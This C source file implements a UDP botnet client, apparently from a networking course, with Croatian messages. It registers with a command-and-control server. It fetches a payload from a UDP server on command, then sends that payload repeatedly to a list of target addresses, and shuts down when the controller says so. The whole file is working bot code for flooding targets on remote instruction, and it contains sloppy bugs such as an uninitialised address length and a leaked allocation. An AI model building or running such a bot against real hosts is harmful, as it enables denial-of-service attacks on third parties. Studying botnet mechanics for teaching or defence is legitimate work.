#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <err.h>
#include <errno.h>
#include <stdbool.h>
#include <time.h>

#define MAXLEN 512

int checkPort(char* port) {
    for(int i = 0; i < strlen(port); i++) {
        if(port[i] < 48 || port[i] > 57) {
            return 1;
        }
    }
    return 0;
}

int main(int argc, char *argv[])
{
    char *IPADDR;
    char *PORT;
    char PAYLOAD[MAXLEN];
    bool payload_set = false;

    typedef struct {
        char IP[INET_ADDRSTRLEN];
        char PORT[22];
    } ip_port;

    typedef struct {
        char command;
        ip_port pairs[20];
    } MSG;

    if(argv[1] == NULL || argv[2] == NULL || argv[3] != NULL) {
        errx(1, "Usage: ./bot server_ip server_port");
    }
    else {
        IPADDR = argv[1];
        PORT = (argv[2]);
    }

    int mysocket;

    mysocket = socket(PF_INET, SOCK_DGRAM, 0);
    if (mysocket == -1) {
        errx(1, "Neuspjesno stvaranje socketa.");
    }

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;

    int error = getaddrinfo(IPADDR, PORT, &hints, &res);
            
    if(error) errx(2, "getaddrinfo: %s", gai_strerror(error));

    char *msg = "REG\n";

    ssize_t sent = sendto(mysocket, msg, strlen(msg), 0, res->ai_addr, res->ai_addrlen);
    if(sent == -1) {
        errx(1, "Neuspjesno slanje.");
    }
    
    while(1) {

        struct sockaddr_in from;
        socklen_t fromaddrlen;
        char recvmsg[MAXLEN];

        MSG *m = (MSG *) malloc(sizeof(MSG));
        memset(m, 0, sizeof(MSG));

        size_t recv = recvfrom(mysocket, recvmsg, MAXLEN, 0, (struct sockaddr *)&from, &fromaddrlen);
        if(recv == -1) {
            errx(1, "Neuspjesno primanje.");
        }

        m = (MSG*)recvmsg;

        int operation = (int)(m->command - '0');

        if(operation == 0) {

            //slanje na udpServer

            memset(&res, 0, sizeof(res));

            char *msgToUdp = "HELLO";

            char *IPADDRudp = m->pairs[0].IP;
            char *PortUDP = (char *)&m->pairs[0].PORT[0];

            int error = getaddrinfo(IPADDRudp, PortUDP, &hints, &res);
            
            if(error) errx(2, "getaddrinfo: %s", gai_strerror(error));

            ssize_t sentToUdp = sendto(mysocket, msgToUdp, strlen(msgToUdp), 0, res->ai_addr, res->ai_addrlen);
            if(sentToUdp == -1) {
                errx(1, "Neuspjesno slanje.");
            }

            size_t recvUdp = recvfrom(mysocket, PAYLOAD, MAXLEN, 0, (struct sockaddr *)&from, &fromaddrlen);
            if(recv == -1) {
                errx(1, "Neuspjesno primanje.");
            }
            payload_set = true;
            PAYLOAD[recvUdp] = '\0';

        }

        else if (operation == 1)
        {

            if(!payload_set) {
                printf("Payload is not set, please ask UDP server.\n");
                continue;
            }

            int numOfTargets = (recv - sizeof(char))/((sizeof(char[22])) + INET_ADDRSTRLEN);
            // struct sockaddr_in targetAddress;
            // targetAddress.sin_family = AF_INET;

            struct addrinfo *targetAddressArrayRES[numOfTargets];

            for(int i = 0; i < numOfTargets; i++) {

                int error = getaddrinfo(m->pairs[i].IP, (char *)&m->pairs[i].PORT, &hints, &targetAddressArrayRES[i]);
            
                if(error) errx(2, "getaddrinfo: %s", gai_strerror(error));

                // int checker = checkPort(m->pairs[i].PORT);
                // if(checker) {
                //     struct servent *s = getservbyname(m->pairs[2].PORT, "udp");
                //     sprintf(m->pairs[i].PORT, "%hu", ntohs(s->s_port));
                // }

                // targetAddressArray[i].sin_family = AF_INET;
                // targetAddressArray[i].sin_port = htons(atoi((char *)&m->pairs[i].PORT));

                // if(inet_pton(AF_INET, m->pairs[i].IP, &(targetAddressArray[i].sin_addr)) != 1) {
                //     errx(1, "%s nije valjanja adresa.\n", IPADDR);
                // }


            }
            for(int i = 0; i < 15; i++) {
                for(int j = 0; j < numOfTargets; j++) {
                    // if(inet_pton(AF_INET, m->pairs[j].IP, &(servaddr.sin_addr)) != 1) {
                    //     errx(1, "%s nije valjanja adresa.\n", IPADDR);
                    // }
                    //targetAddress.sin_port = htons(atoi((char *)&m->pairs[j].PORT));
                    //printf("Saljem na %s, %d\n", inet_ntoa(targetAddressArray[j].sin_addr), targetAddressArray[j].sin_port);
                    ssize_t sentToTargets = sendto(mysocket, PAYLOAD, strlen(PAYLOAD), 0, targetAddressArrayRES[j]->ai_addr, targetAddressArrayRES[j]->ai_addrlen);
                    if(sentToTargets == -1) {
                        errx(1, "Neuspjesno slanje targetima.\n");
                    }
                }
                sleep(1);
            }
        }

        else if (operation == 2) {
            printf("C&C je zavrsio sa radim, gasim se.\n");
            exit(0);
        }
        
        else {
            printf("Nisam dobio odgovarajuci operationId\n");
        }
    
    }

    return 0;
}